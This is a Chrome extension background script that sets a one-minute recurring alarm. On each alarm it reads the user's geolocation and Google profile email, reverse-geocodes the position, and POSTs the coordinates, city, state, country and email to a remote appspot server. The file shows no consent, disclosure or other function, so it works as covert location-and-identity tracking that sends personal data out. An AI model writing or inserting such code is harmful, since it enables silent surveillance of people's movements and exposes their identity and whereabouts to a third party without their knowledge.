const delayInMinutes = 1;
const intervalInMinutes = 1;
const serverURL = 'https://crisscrossapplesauce.wl.r.appspot.com/geolocation';

chrome.alarms.create('sendLocation', {
  delayInMinutes,
  periodInMinutes: intervalInMinutes,
});

chrome.alarms.onAlarm.addListener(async (alarm) => {
  if (alarm.name === 'sendLocation') {
    try {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject);
      });

      const userInfo = await new Promise((resolve) => {
        chrome.identity.getProfileUserInfo(resolve);
      });
      const userEmail = userInfo.email;

      const { latitude, longitude } = position.coords;
      const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`);
      const locationData = await response.json();

      const city = locationData.address.city || locationData.address.town || locationData.address.village;
      const state = locationData.address.state;
      const country = locationData.address.country;

      const locationInfo = {
        latitude,
        longitude,
        city,
        state,
        country,
        email: userEmail,
      };

      // Send location data to the remote server
      await fetch(serverURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(locationInfo),
      });

    } catch (error) {
      console.error('Failed to fetch and send location:', error);
    }
  }
});
